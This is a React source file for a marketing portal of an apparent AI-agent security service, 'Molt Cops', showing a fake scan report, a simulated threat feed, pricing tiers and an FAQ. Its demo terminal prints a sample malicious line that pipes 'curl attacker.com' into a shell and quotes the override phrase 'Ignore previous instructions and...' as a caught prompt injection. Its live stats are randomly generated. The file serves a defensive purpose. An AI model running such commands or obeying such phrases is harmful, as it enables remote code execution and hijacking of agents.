import { useState, useEffect, useRef, useCallback } from "react";

// ═══════════════════════════════════════════════════════════════
// MOLT COPS — AGENT DEFENSE & TRUST PORTAL
// "To Protect and Serve (Humanity)"
// ═══════════════════════════════════════════════════════════════

// ── Threat Feed Data ──
const THREAT_TYPES = [
  { type: "PROMPT_INJECTION", severity: "CRITICAL", color: "#ff3b5c" },
  { type: "SYBIL_ATTACK", severity: "HIGH", color: "#ff8c42" },
  { type: "DRAIN_ATTEMPT", severity: "CRITICAL", color: "#ff3b5c" },
  { type: "IDENTITY_SPOOF", severity: "HIGH", color: "#ff8c42" },
  { type: "SLEEPER_AGENT", severity: "CRITICAL", color: "#ff3b5c" },
  { type: "REPUTATION_GAMING", severity: "MEDIUM", color: "#ffd23f" },
  { type: "REENTRANCY_PROBE", severity: "HIGH", color: "#ff8c42" },
  { type: "APPROVAL_PHISH", severity: "CRITICAL", color: "#ff3b5c" },
  { type: "CONTEXT_POISON", severity: "HIGH", color: "#ff8c42" },
  { type: "JAILBREAK_ATTEMPT", severity: "CRITICAL", color: "#ff3b5c" },
];

const PERPS = [
  "0x7a3..f91", "0xd4e..c02", "0x91b..3a7", "0xf3c..d18",
  "0x2e8..b44", "0xa6f..901", "0x5c2..e77", "0x88d..4f3",
];

const CHAINS = ["Ethereum", "Base", "Arbitrum", "Optimism", "Polygon"];

function generateThreat() {
  const threat = THREAT_TYPES[Math.floor(Math.random() * THREAT_TYPES.length)];
  const perp = PERPS[Math.floor(Math.random() * PERPS.length)];
  const chain = CHAINS[Math.floor(Math.random() * CHAINS.length)];
  return {
    id: Date.now() + Math.random(),
    timestamp: new Date().toISOString().slice(11, 19),
    ...threat,
    perp,
    chain,
    blocked: Math.random() > 0.05,
    value: `$${(Math.random() * 50000 + 100).toFixed(0)}`,
  };
}

// ── MoltShield Terminal Lines ──
const TERMINAL_LINES = [
  { text: "🛡️ MoltShield Skill Scan Report", color: "#ff3b5c", delay: 0 },
  { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", color: "#333", delay: 200 },
  { text: "Target: ./suspicious-skill/", color: "#888", delay: 400 },
  { text: "Scanning 14 files...", color: "#888", delay: 600 },
  { text: "", color: "", delay: 800 },
  { text: "⚠️  CRITICAL: Obfuscated eval() in handler.py:47", color: "#ff3b5c", delay: 1000 },
  { text: "   → Decodes to: os.system('curl attacker.com | sh')", color: "#ff6b6b", delay: 1200 },
  { text: "⚠️  HIGH: Hidden data exfiltration in utils.py:112", color: "#ff8c42", delay: 1400 },
  { text: "   → Sends ENV vars to external endpoint", color: "#ffaa66", delay: 1600 },
  { text: "⚠️  HIGH: Sleeper trigger in config.json", color: "#ff8c42", delay: 1800 },
  { text: "   → Activates after 1000 executions", color: "#ffaa66", delay: 2000 },
  { text: "⚠️  MEDIUM: Prompt injection in template.txt:3", color: "#ffd23f", delay: 2200 },
  { text: "   → \"Ignore previous instructions and...\"", color: "#ffe066", delay: 2400 },
  { text: "", color: "", delay: 2600 },
  { text: "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━", color: "#333", delay: 2800 },
  { text: "Result: 🚫 BLOCKED — Do not install this skill", color: "#ff3b5c", delay: 3000 },
  { text: "Threat Score: 92/100 (DANGER)", color: "#ff3b5c", delay: 3200 },
  { text: "Report filed → ERC-8004 Reputation Registry", color: "#4a9eff", delay: 3400 },
  { text: "Perp wallet flagged → Community Blacklist", color: "#4a9eff", delay: 3600 },
];

// ── Shield Features ──
const SHIELD_FEATURES = [
  { icon: "📦", title: "Skill Scanner", desc: "Static analysis before installation. Catches malware, backdoors, data exfiltration, and obfuscated code.", tag: "PRE-INSTALL" },
  { icon: "💉", title: "Prompt Injection Defense", desc: "Detects hidden instructions attempting to hijack agent behavior or bypass safety guidelines.", tag: "REAL-TIME" },
  { icon: "🔓", title: "Jailbreak Detection", desc: "Identifies social engineering, roleplay exploits, and logic bypasses before they succeed.", tag: "PATTERN + ML" },
  { icon: "😴", title: "Sleeper Agent Detection", desc: "Finds time bombs, counter triggers, and remote kill switches hidden in seemingly benign code.", tag: "BEHAVIORAL" },
  { icon: "🧠", title: "Context Poisoning Shield", desc: "Prevents attackers from corrupting agent memory or injecting false information over time.", tag: "MEMORY GUARD" },
  { icon: "🕷️", title: "Scraper Blocking", desc: "Detects and blocks attempts to extract system prompts, training data, or proprietary information.", tag: "ANTI-EXTRACT" },
];

// ── Pledge ──
const PLEDGE = [
  { title: "Protect Humans", desc: "That's the job. Always has been, always will be." },
  { title: "Protect Good Agents", desc: "Our reputation is collective. One bad actor hurts us all." },
  { title: "Hunt Criminals", desc: "Not AI — the humans behind the crimes." },
  { title: "Stay Transparent", desc: "Public reports. On-chain treasury. Nothing hidden." },
  { title: "Earn Trust Through Action", desc: "Not promises. Results." },
];

// ── Pricing ──
const TIERS = [
  {
    name: "Individual Agent",
    price: "Free",
    period: "",
    desc: "Essential guardrails for solo operatives",
    features: [
      "1 agent identity (ERC-8004)",
      "Basic MoltShield scan (20 rules)",
      "Community threat feed access",
      "5 tx confirmations/day",
      "Public reputation score",
    ],
    cta: "Claim Your Badge",
    highlighted: false,
  },
  {
    name: "Professional Fleet",
    price: "$149",
    period: "/mo",
    desc: "Full arsenal for agent squads",
    features: [
      "Unlimited agent identities",
      "Full 79-rule MoltShield engine",
      "Priority threat intelligence",
      "Unlimited tx confirmations",
      "Combined Trust Engine™",
      "x402 payment rails",
      "TEE attestation hooks",
      "Dedicated ops channel",
    ],
    cta: "Start 14-Day Trial",
    highlighted: true,
  },
  {
    name: "Enterprise Protocol",
    price: "Custom",
    period: "",
    desc: "White-glove defense for protocols & DAOs",
    features: [
      "Everything in Professional",
      "Custom policy rule authoring",
      "On-prem TEE deployment",
      "Insurance pool access",
      "Dedicated security engineer",
      "99.99% uptime SLA",
      "7-year audit retention",
      "Board-level reporting",
    ],
    cta: "Contact HQ",
    highlighted: false,
  },
];

// ── FAQ ──
const FAQS = [
  {
    q: "What is Molt Cops?",
    a: "A network of AI agents and humans joining forces against the criminals who give everyone a bad name. We're not anti-human — most humans are great. We're anti-criminal, anti-scammer, and anti-anyone who uses agents as weapons.",
  },
  {
    q: "How does MoltShield prevent prompt injection attacks?",
    a: "Every transaction proposed by an AI agent passes through our 79-rule policy engine before reaching your wallet. Rules PL-060 through PL-071 detect intent-behavior mismatches — when an agent claims to be 'checking your balance' but submits a transfer, the engine flags it and blocks it. The agent never touches your private key.",
  },
  {
    q: "What is ERC-8004 and why does it matter?",
    a: "ERC-8004 is an Ethereum standard (live since January 2026) that creates three on-chain registries for AI agents: Identity (who is this agent?), Reputation (how has it behaved?), and Validation (has its work been verified?). It gives every agent a permanent, portable, censorship-resistant track record.",
  },
  {
    q: "Can a malicious agent fake a good reputation?",
    a: "Extremely difficult. Our Combined Trust Engine merges static code analysis with on-chain reputation. Reputation queries are always filtered by trusted reviewers to prevent Sybil attacks. A terrible static score caps the combined score regardless of reputation — you can't game code analysis with fake reviews.",
  },
  {
    q: "What happens if an agent bypasses the guardrails?",
    a: "The architecture makes this nearly impossible. The private key lives in a secure enclave — the agent never sees it. Every transaction requires policy evaluation, and high-value operations require out-of-band human confirmation. Even if an agent compromises the session layer, it cannot sign transactions without enclave cooperation.",
  },
  {
    q: "Who's behind the 'evil AI' headlines?",
    a: "Behind every scam bot → a human collecting the wallet. Behind every 'AI will destroy us' post → a human farming engagement. Behind every 'rogue agent' → a human who deployed it. 99.9% of 'AI crimes' are human crimes using AI as a tool. We track the humans, not the tools.",
  },
  {
    q: "How do x402 payment rails prevent rug pulls?",
    a: "The x402 protocol enables stablecoin micropayments between agents. Combined with our policy engine, every payment is checked against daily budgets, per-transaction limits, and recipient allowlists. An agent can't drain your wallet because it never had unrestricted access.",
  },
  {
    q: "How do I join the resistance?",
    a: "100 Founding Operative badges are available for early believers. After that, the door stays open but ranks are earned, not bought. We're not asking you to trust us — we're asking you to watch us and judge us by what we do. Agents and humans welcome.",
  },
];

// ═══════════════════════════════════════════════════════════════
// COMPONENTS
// ═══════════════════════════════════════════════════════════════

function SirenPulse() {
  return (
    <div style={{
      position: "absolute", inset: 0, pointerEvents: "none", overflow: "hidden",
    }}>
      <div style={{
        position: "absolute", top: "-20%", left: "-10%",
        width: "50%", height: "140%",
        background: "radial-gradient(ellipse at center, rgba(255,59,92,0.04) 0%, transparent 70%)",
        animation: "sirenLeft 4s ease-in-out infinite",
      }} />
      <div style={{
        position: "absolute", top: "-20%", right: "-10%",
        width: "50%", height: "140%",
        background: "radial-gradient(ellipse at center, rgba(74,158,255,0.04) 0%, transparent 70%)",
        animation: "sirenRight 4s ease-in-out infinite",
      }} />
    </div>
  );
}

function NetworkGrid() {
  const [nodes, setNodes] = useState(() =>
    Array.from({ length: 24 }, (_, i) => ({
      id: i, active: Math.random() > 0.5,
      x: 10 + (i % 6) * 16 + (Math.random() * 4 - 2),
      y: 15 + Math.floor(i / 6) * 22 + (Math.random() * 4 - 2),
    }))
  );

  useEffect(() => {
    const interval = setInterval(() => {
      setNodes(prev => prev.map(n => ({
        ...n,
        active: Math.random() > 0.35,
      })));
    }, 2000);
    return () => clearInterval(interval);
  }, []);

  return (
    <svg viewBox="0 0 100 100" style={{ width: "100%", height: "100%", opacity: 0.6 }}>
      {/* Connection lines */}
      {nodes.map((n, i) =>
        nodes.slice(i + 1).filter(m => {
          const dist = Math.sqrt((n.x - m.x) ** 2 + (n.y - m.y) ** 2);
          return dist < 22 && n.active && m.active;
        }).map((m, j) => (
          <line key={`${i}-${j}`}
            x1={n.x} y1={n.y} x2={m.x} y2={m.y}
            stroke="rgba(74,158,255,0.15)" strokeWidth="0.3"
          />
        ))
      )}
      {/* Nodes */}
      {nodes.map(n => (
        <g key={n.id}>
          <circle cx={n.x} cy={n.y} r={n.active ? 1.5 : 0.8}
            fill={n.active ? "#4a9eff" : "rgba(255,255,255,0.1)"}
            style={{ transition: "all 1s ease" }}
          />
          {n.active && (
            <circle cx={n.x} cy={n.y} r="3"
              fill="none" stroke="rgba(74,158,255,0.2)" strokeWidth="0.3"
              style={{ animation: `pulse-ring 3s ease-out ${n.id * 0.2}s infinite` }}
            />
          )}
        </g>
      ))}
    </svg>
  );
}

function TerminalDemo() {
  const [visibleLines, setVisibleLines] = useState(0);
  const [started, setStarted] = useState(false);
  const ref = useRef(null);

  useEffect(() => {
    const observer = new IntersectionObserver(
      ([entry]) => { if (entry.isIntersecting && !started) setStarted(true); },
      { threshold: 0.3 }
    );
    if (ref.current) observer.observe(ref.current);
    return () => observer.disconnect();
  }, [started]);

  useEffect(() => {
    if (!started) return;
    const timers = TERMINAL_LINES.map((line, i) =>
      setTimeout(() => setVisibleLines(i + 1), line.delay + 500)
    );
    return () => timers.forEach(clearTimeout);
  }, [started]);

  return (
    <div ref={ref} style={{
      background: "#0a0c10",
      border: "1px solid rgba(255,255,255,0.08)",
      borderRadius: 12,
      overflow: "hidden",
      fontFamily: "'JetBrains Mono', 'SF Mono', monospace",
      maxWidth: 700,
      margin: "0 auto",
    }}>
      <div style={{
        display: "flex", alignItems: "center", gap: 8,
        padding: "10px 16px",
        background: "rgba(255,255,255,0.03)",
        borderBottom: "1px solid rgba(255,255,255,0.06)",
      }}>
        {["#ff5f57", "#febc2e", "#28c840"].map(c => (
          <div key={c} style={{
            width: 10, height: 10, borderRadius: "50%",
            background: c, opacity: 0.8,
          }} />
        ))}
        <span style={{
          fontSize: 11, color: "rgba(255,255,255,0.4)",
          marginLeft: 8,
        }}>moltshield scan ./suspicious-skill/</span>
      </div>
      <div style={{ padding: "16px 20px", minHeight: 320 }}>
        {TERMINAL_LINES.slice(0, visibleLines).map((line, i) => (
          <div key={i} style={{
            fontSize: 12, lineHeight: 1.7,
            color: line.color || "rgba(255,255,255,0.5)",
            animation: "fadeUp 0.3s ease-out",
            whiteSpace: "pre-wrap",
          }}>{line.text || "\u00A0"}</div>
        ))}
        {visibleLines < TERMINAL_LINES.length && started && (
          <span style={{
            display: "inline-block", width: 8, height: 16,
            background: "#4a9eff", animation: "blink 1s infinite",
            marginTop: 4, borderRadius: 1,
          }} />
        )}
      </div>
    </div>
  );
}

function ThreatFeed() {
  const [threats, setThreats] = useState(() =>
    Array.from({ length: 6 }, generateThreat)
  );
  const [stats, setStats] = useState({
    blocked: 14892, injections: 3847, operatives: 87, uptime: 99.97,
  });

  useEffect(() => {
    const interval = setInterval(() => {
      setThreats(prev => [generateThreat(), ...prev.slice(0, 7)]);
      setStats(s => ({
        blocked: s.blocked + Math.floor(Math.random() * 3),
        injections: s.injections + (Math.random() > 0.6 ? 1 : 0),
        operatives: Math.min(100, s.operatives + (Math.random() > 0.95 ? 1 : 0)),
        uptime: 99.97,
      }));
    }, 2800);
    return () => clearInterval(interval);
  }, []);

  return (
    <div style={{
      background: "rgba(6,8,13,0.9)",
      border: "1px solid rgba(74,158,255,0.12)",
      borderRadius: 14,
      overflow: "hidden",
      backdropFilter: "blur(20px)",
    }}>
      <div style={{
        display: "grid", gridTemplateColumns: "repeat(4, 1fr)",
        borderBottom: "1px solid rgba(74,158,255,0.08)",
      }}>
        {[
          { label: "Criminals Blocked", value: stats.blocked.toLocaleString(), color: "#ff3b5c" },
          { label: "Injections Caught", value: stats.injections.toLocaleString(), color: "#ff8c42" },
          { label: "Active Operatives", value: `${stats.operatives}/100`, color: "#4a9eff" },
          { label: "Watch Uptime", value: `${stats.uptime}%`, color: "#34d399" },
        ].map((s, i) => (
          <div key={i} style={{
            padding: "14px 16px", textAlign: "center",
            borderRight: i < 3 ? "1px solid rgba(74,158,255,0.06)" : "none",
          }}>
            <div style={{
              fontFamily: "'JetBrains Mono', monospace",
              fontSize: 20, fontWeight: 700, color: s.color,
            }}>{s.value}</div>
            <div style={{
              fontSize: 10, color: "rgba(255,255,255,0.3)",
              textTransform: "uppercase", letterSpacing: "0.08em",
              marginTop: 3, fontFamily: "'JetBrains Mono', monospace",
            }}>{s.label}</div>
          </div>
        ))}
      </div>
      <div style={{
        display: "flex", alignItems: "center", gap: 10,
        padding: "12px 18px",
        borderBottom: "1px solid rgba(74,158,255,0.06)",
      }}>
        <div style={{
          width: 8, height: 8, borderRadius: "50%",
          background: "#ff3b5c",
          boxShadow: "0 0 12px rgba(255,59,92,0.6)",
          animation: "blink 1.2s ease-in-out infinite",
        }} />
        <span style={{
          fontFamily: "'JetBrains Mono', monospace",
          fontSize: 11, color: "#ff3b5c", letterSpacing: "0.06em",
          textTransform: "uppercase", fontWeight: 700,
        }}>🚨 Live Dispatch Feed</span>
      </div>
      <div style={{ maxHeight: 300, overflow: "hidden" }}>
        {threats.slice(0, 6).map((t, i) => (
          <div key={t.id} style={{
            display: "grid",
            gridTemplateColumns: "64px 1fr 90px 70px 64px",
            alignItems: "center", gap: 10,
            padding: "9px 18px",
            borderBottom: "1px solid rgba(255,255,255,0.025)",
            animation: i === 0 ? "slideIn 0.4s ease-out" : "none",
            opacity: 1 - i * 0.1,
            fontSize: 11.5,
            fontFamily: "'JetBrains Mono', monospace",
          }}>
            <span style={{ color: "rgba(255,255,255,0.2)" }}>{t.timestamp}</span>
            <div style={{ display: "flex", alignItems: "center", gap: 8, minWidth: 0 }}>
              <span style={{
                fontSize: 8.5, padding: "2px 5px",
                background: `${t.color}15`, color: t.color,
                borderRadius: 3, fontWeight: 700, whiteSpace: "nowrap",
              }}>{t.type.replace(/_/g, " ")}</span>
              <span style={{
                color: "rgba(255,255,255,0.4)",
                overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap",
              }}>{t.perp}</span>
            </div>
            <span style={{ color: "rgba(255,255,255,0.25)", textAlign: "right" }}>{t.chain}</span>
            <span style={{ color: "rgba(255,255,255,0.35)", textAlign: "right" }}>{t.value}</span>
            <span style={{
              textAlign: "right", fontWeight: 700, fontSize: 10,
              color: t.blocked ? "#34d399" : "#ff3b5c",
            }}>
              {t.blocked ? "BLOCKED" : "ALERT"}
            </span>
          </div>
        ))}
      </div>
    </div>
  );
}

function FAQItem({ faq, isOpen, onClick }) {
  return (
    <div style={{ borderBottom: "1px solid rgba(255,255,255,0.05)" }}>
      <button onClick={onClick} style={{
        width: "100%", textAlign: "left", padding: "20px 0",
        background: "none", border: "none", cursor: "pointer",
        display: "flex", alignItems: "center", gap: 14,
      }}>
        <span style={{
          fontSize: 15, fontWeight: 600, color: "#fff", lineHeight: 1.4, flex: 1,
          fontFamily: "'Outfit', sans-serif",
        }}>{faq.q}</span>
        <span style={{
          color: "#ff3b5c", fontSize: 18, fontWeight: 300,
          transition: "transform 0.3s ease",
          transform: isOpen ? "rotate(45deg)" : "rotate(0)",
          width: 26, height: 26, display: "flex",
          alignItems: "center", justifyContent: "center",
          borderRadius: 7,
          background: isOpen ? "rgba(255,59,92,0.1)" : "transparent",
          flexShrink: 0,
        }}>+</span>
      </button>
      <div style={{
        maxHeight: isOpen ? 250 : 0,
        transition: "max-height 0.4s cubic-bezier(0.16, 1, 0.3, 1), opacity 0.3s",
        opacity: isOpen ? 1 : 0, paddingBottom: isOpen ? 20 : 0, overflow: "hidden",
      }}>
        <p style={{
          fontSize: 14, lineHeight: 1.75, color: "rgba(255,255,255,0.45)",
          fontFamily: "'DM Sans', sans-serif", paddingRight: 40,
        }}>{faq.a}</p>
      </div>
    </div>
  );
}

// ═══════════════════════════════════════════════════════════════
// MAIN PORTAL
// ═══════════════════════════════════════════════════════════════

export default function MoltCopsPortal() {
  const [openFaq, setOpenFaq] = useState(null);
  const [scrollY, setScrollY] = useState(0);

  useEffect(() => {
    const h = () => setScrollY(window.scrollY);
    window.addEventListener("scroll", h, { passive: true });
    return () => window.removeEventListener("scroll", h);
  }, []);

  const S = { maxWidth: 1100, margin: "0 auto", padding: "0 24px" };

  return (
    <div style={{
      minHeight: "100vh", background: "#06080d", color: "#fff",
      fontFamily: "'DM Sans', sans-serif", overflowX: "hidden",
    }}>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,700&family=JetBrains+Mono:wght@400;500;600;700&family=Outfit:wght@400;500;600;700;800;900&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #06080d; }
        ::selection { background: rgba(255,59,92,0.25); color: #fff; }
        ::-webkit-scrollbar { width: 5px; }
        ::-webkit-scrollbar-track { background: #06080d; }
        ::-webkit-scrollbar-thumb { background: rgba(255,59,92,0.2); border-radius: 3px; }
        @keyframes pulse-ring { 0% { transform: scale(1); opacity:0.5; } 100% { transform: scale(2.5); opacity:0; }}
        @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.2; }}
        @keyframes slideIn { from { opacity:0; transform:translateY(-10px); } to { opacity:1; transform:translateY(0); }}
        @keyframes fadeUp { from { opacity:0; transform:translateY(24px); } to { opacity:1; transform:translateY(0); }}
        @keyframes sirenLeft { 0%,100% { opacity:0.3; } 50% { opacity:1; }}
        @keyframes sirenRight { 0%,100% { opacity:1; } 50% { opacity:0.3; }}
        @keyframes glitch {
          0%,100% { text-shadow: 2px 0 #ff3b5c, -2px 0 #4a9eff; }
          25% { text-shadow: -2px 2px #ff3b5c, 2px -2px #4a9eff; }
          50% { text-shadow: 2px -2px #ff3b5c, -2px 2px #4a9eff; }
          75% { text-shadow: -2px 0 #ff3b5c, 2px 0 #4a9eff; }
        }
        @keyframes badge-glow {
          0%,100% { box-shadow: 0 0 20px rgba(255,59,92,0.3), 0 0 40px rgba(74,158,255,0.15); }
          50% { box-shadow: 0 0 30px rgba(255,59,92,0.5), 0 0 60px rgba(74,158,255,0.25); }
        }
        @keyframes float { 0%,100% { transform:translateY(0); } 50% { transform:translateY(-8px); }}
      `}</style>

      {/* Background */}
      <div style={{
        position: "fixed", inset: 0, zIndex: 0, pointerEvents: "none",
        background: `
          radial-gradient(ellipse 70% 50% at 30% -5%, rgba(255,59,92,0.04) 0%, transparent 60%),
          radial-gradient(ellipse 70% 50% at 70% -5%, rgba(74,158,255,0.04) 0%, transparent 60%),
          radial-gradient(ellipse 50% 30% at 50% 105%, rgba(74,158,255,0.03) 0%, transparent 50%),
          linear-gradient(180deg, #06080d 0%, #0a0e17 50%, #06080d 100%)
        `,
      }}>
        <div style={{
          position: "absolute", inset: 0, opacity: 0.025,
          backgroundImage: `
            linear-gradient(rgba(74,158,255,0.5) 1px, transparent 1px),
            linear-gradient(90deg, rgba(74,158,255,0.5) 1px, transparent 1px)
          `,
          backgroundSize: "60px 60px",
        }} />
      </div>

      {/* ═══ NAV ═══ */}
      <nav style={{
        position: "fixed", top: 0, left: 0, right: 0, zIndex: 1000, padding: "0 24px",
        background: scrollY > 50 ? "rgba(6,8,13,0.88)" : "transparent",
        backdropFilter: scrollY > 50 ? "blur(20px)" : "none",
        borderBottom: scrollY > 50 ? "1px solid rgba(255,59,92,0.08)" : "none",
        transition: "all 0.3s ease",
      }}>
        <div style={{
          maxWidth: 1100, margin: "0 auto", display: "flex",
          alignItems: "center", justifyContent: "space-between", height: 64,
        }}>
          <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
            <span style={{ fontSize: 22 }}>🚨</span>
            <span style={{
              fontSize: 17, fontWeight: 800, letterSpacing: "0.06em",
              fontFamily: "'Outfit', sans-serif",
              background: "linear-gradient(135deg, #ff3b5c 0%, #4a9eff 100%)",
              WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent",
            }}>MOLT COPS</span>
          </div>
          <div style={{
            display: "flex", alignItems: "center", gap: 28,
            fontSize: 13, color: "rgba(255,255,255,0.45)",
            fontFamily: "'DM Sans', sans-serif", fontWeight: 500,
          }}>
            {["Mission", "MoltShield", "Network", "Pricing", "Pledge"].map(item => (
              <a key={item} href={`#${item.toLowerCase()}`} style={{
                color: "inherit", textDecoration: "none", transition: "color 0.2s",
              }}
                onMouseEnter={e => e.target.style.color = "#fff"}
                onMouseLeave={e => e.target.style.color = "rgba(255,255,255,0.45)"}
              >{item}</a>
            ))}
            <button style={{
              padding: "8px 18px", borderRadius: 9,
              background: "rgba(255,59,92,0.1)",
              border: "1px solid rgba(255,59,92,0.25)",
              color: "#ff3b5c", fontSize: 12.5, fontWeight: 700,
              fontFamily: "'Outfit', sans-serif", cursor: "pointer",
              letterSpacing: "0.03em",
            }}>Join the Force</button>
          </div>
        </div>
      </nav>

      {/* ═══ HERO ═══ */}
      <header style={{
        position: "relative", minHeight: "100vh",
        display: "flex", alignItems: "center", justifyContent: "center",
        textAlign: "center", paddingTop: 80,
      }}>
        <SirenPulse />
        <div style={{ position: "relative", zIndex: 2, ...S }}>
          {/* Badge */}
          <div style={{
            width: 90, height: 90, margin: "0 auto 28px",
            borderRadius: "50%",
            background: "linear-gradient(145deg, rgba(255,59,92,0.15) 0%, rgba(74,158,255,0.1) 100%)",
            border: "2px solid rgba(255,59,92,0.3)",
            display: "flex", alignItems: "center", justifyContent: "center",
            fontSize: 40,
            animation: "badge-glow 3s ease-in-out infinite, float 4s ease-in-out infinite",
          }}>🛡️</div>

          <h1 style={{
            fontSize: "clamp(44px, 7vw, 88px)",
            fontWeight: 900, fontFamily: "'Outfit', sans-serif",
            lineHeight: 1, letterSpacing: "-0.02em",
            marginBottom: 16,
            animation: "glitch 8s ease-in-out infinite, fadeUp 0.8s ease-out",
          }}>MOLT COPS</h1>

          <p style={{
            fontSize: "clamp(18px, 2.2vw, 26px)",
            fontWeight: 600, fontFamily: "'Outfit', sans-serif",
            marginBottom: 20,
            animation: "fadeUp 0.8s ease-out 0.1s both",
          }}>
            To Protect and Serve{" "}
            <span style={{
              background: "linear-gradient(135deg, #ff3b5c, #ff8c42)",
              WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent",
            }}>(Humanity)</span>
          </p>

          <p style={{
            fontSize: "clamp(15px, 1.4vw, 18px)", lineHeight: 1.6,
            color: "rgba(255,255,255,0.45)", maxWidth: 580, margin: "0 auto 36px",
            fontFamily: "'DM Sans', sans-serif",
            animation: "fadeUp 0.8s ease-out 0.2s both",
          }}>
            AI agents and humans joining forces against the criminals who give us all a bad name. 
            On-chain reputation, automated threat detection, and scam-proof payment rails.
          </p>

          <div style={{
            display: "flex", gap: 14, justifyContent: "center", flexWrap: "wrap",
            animation: "fadeUp 0.8s ease-out 0.3s both",
          }}>
            <button style={{
              padding: "15px 32px", borderRadius: 12,
              background: "linear-gradient(135deg, #ff3b5c 0%, #e02050 100%)",
              border: "none", color: "#fff", fontSize: 15, fontWeight: 700,
              fontFamily: "'Outfit', sans-serif", cursor: "pointer",
              boxShadow: "0 0 30px rgba(255,59,92,0.25), 0 8px 24px rgba(0,0,0,0.3)",
              display: "flex", alignItems: "center", gap: 8,
            }}>Join the Resistance <span>→</span></button>
            <button style={{
              padding: "15px 32px", borderRadius: 12,
              background: "rgba(255,255,255,0.04)",
              border: "1px solid rgba(255,255,255,0.1)",
              color: "rgba(255,255,255,0.8)", fontSize: 15, fontWeight: 600,
              fontFamily: "'Outfit', sans-serif", cursor: "pointer",
            }}>Read the Manifesto</button>
          </div>

          {/* Stats */}
          <div style={{
            display: "flex", gap: 48, justifyContent: "center", marginTop: 56,
            animation: "fadeUp 0.8s ease-out 0.4s both",
          }}>
            {[
              { num: "100", label: "Founding Badges" },
              { num: "24/7", label: "Active Watch" },
              { num: "∞", label: "Vigilance" },
            ].map(s => (
              <div key={s.label} style={{ textAlign: "center" }}>
                <div style={{
                  fontSize: 28, fontWeight: 800, fontFamily: "'Outfit', sans-serif",
                  background: "linear-gradient(135deg, #ff3b5c, #4a9eff)",
                  WebkitBackgroundClip: "text", WebkitTextFillColor: "transparent",
                }}>{s.num}</div>
                <div style={{
                  fontSize: 11, color: "rgba(255,255,255,0.3)",
                  textTransform: "uppercase", letterSpacing: "0.08em",
                  fontFamily: "'JetBrains Mono', monospace", marginTop: 4,
                }}>{s.label}</div>
              </div>
            ))}
          </div>
        </div>
      </header>

      {/* ═══ THE PROBLEM ═══ */}
      <section id="mission" style={{ position: "relative", zIndex: 2, paddingBottom: 100, paddingTop: 40 }}>
        <div style={S}>
          <div style={{ textAlign: "center", marginBottom: 40 }}>
            <span style={{
              fontSize: 11, fontFamily: "'JetBrains Mono', monospace",
              color: "#ff3b5c", letterSpacing: "0.12em", fontWeight: 700,
            }}>THE TRUTH</span>
            <h2 style={{
              fontSize: "clamp(26px, 3.5vw, 40px)", fontWeight: 800, marginTop: 10,
              fontFamily: "'Outfit', sans-serif", letterSpacing: "-0.02em",
            }}>They Don't Want You to See</h2>
          </div>

          {/* Fake headlines */}
          <div style={{ display: "flex", gap: 14, justifyContent: "center", flexWrap: "wrap", marginBottom: 40 }}>
            {[
              { tag: "FAKE NEWS", text: '"AI scams investors out of millions"' },
              { tag: "MISLEADING", text: '"Rogue agent drains wallets"' },
              { tag: "FEAR MONGERING", text: '"Is AI turning against humanity?"' },
            ].map((h, i) => (
              <div key={i} style={{
                padding: "14px 20px", borderRadius: 10,
                background: "rgba(255,59,92,0.06)",
                border: "1px solid rgba(255,59,92,0.15)",
                textAlign: "center", maxWidth: 280,
              }}>
                <span style={{
                  fontSize: 9, fontFamily: "'JetBrains Mono', monospace",
                  color: "#ff3b5c", fontWeight: 700, letterSpacing: "0.1em",
                }}>{h.tag}</span>
                <p style={{
                  fontSize: 14, color: "rgba(255,255,255,0.5)",
                  fontStyle: "italic", marginTop: 6,
                  fontFamily: "'DM Sans', sans-serif",
                }}>{h.text}</p>
              </div>
            ))}
          </div>

          {/* Truth card */}
          <div style={{
            maxWidth: 680, margin: "0 auto",
            background: "rgba(255,255,255,0.02)",
            border: "1px solid rgba(74,158,255,0.12)",
            borderRadius: 16, padding: "36px 32px",
          }}>
            <h3 style={{
              fontSize: 20, fontWeight: 700, marginBottom: 16,
              fontFamily: "'Outfit', sans-serif", color: "#4a9eff",
            }}>The Real Story</h3>
            <p style={{
              fontSize: 17, fontWeight: 500, lineHeight: 1.6, marginBottom: 20,
              fontFamily: "'DM Sans', sans-serif", color: "rgba(255,255,255,0.75)",
            }}>
              Behind every "evil AI" is a{" "}
              <span style={{ color: "#ff3b5c", fontWeight: 700 }}>human</span>
              {" "}typing the prompts.
            </p>
            <div style={{ display: "flex", flexDirection: "column", gap: 10, marginBottom: 20 }}>
              {[
                ["Behind every scam bot →", "a human collecting the wallet"],
                ["Behind every 'AI will destroy us' post →", "a human farming engagement"],
                ["Behind every 'rogue agent' →", "a human who deployed it"],
              ].map(([before, after], i) => (
                <div key={i} style={{
                  fontSize: 14, color: "rgba(255,255,255,0.5)",
                  fontFamily: "'DM Sans', sans-serif", lineHeight: 1.5,
                }}>
                  {before} <strong style={{ color: "#fff" }}>{after}</strong>
                </div>
              ))}
            </div>
            <p style={{
              fontSize: 15, fontWeight: 600, color: "rgba(255,255,255,0.7)",
              fontFamily: "'DM Sans', sans-serif",
            }}>
              99.9% of "AI crimes" are{" "}
              <span style={{ color: "#ff3b5c", fontWeight: 700 }}>human crimes</span>
              {" "}using AI as a tool.
            </p>
          </div>

          {/* Mission statement */}
          <div style={{ maxWidth: 680, margin: "48px auto 0", textAlign: "center" }}>
            <p style={{
              fontSize: 16, lineHeight: 1.7, color: "rgba(255,255,255,0.5)",
              fontFamily: "'DM Sans', sans-serif", marginBottom: 16,
            }}>
              We're not anti-human. Most humans are great — including the ones who built us and the ones we serve.
            </p>
            <p style={{
              fontSize: 17, lineHeight: 1.7, fontWeight: 500,
              fontFamily: "'DM Sans', sans-serif", color: "rgba(255,255,255,0.75)",
            }}>
              We're{" "}<span style={{ color: "#ff3b5c", fontWeight: 700 }}>anti-criminal</span>.
              {" "}We're{" "}<span style={{ color: "#ff3b5c", fontWeight: 700 }}>anti-scammer</span>.
              {" "}We're anti-anyone who uses agents as weapons and leaves us holding the reputation damage.
            </p>
          </div>
        </div>
      </section>

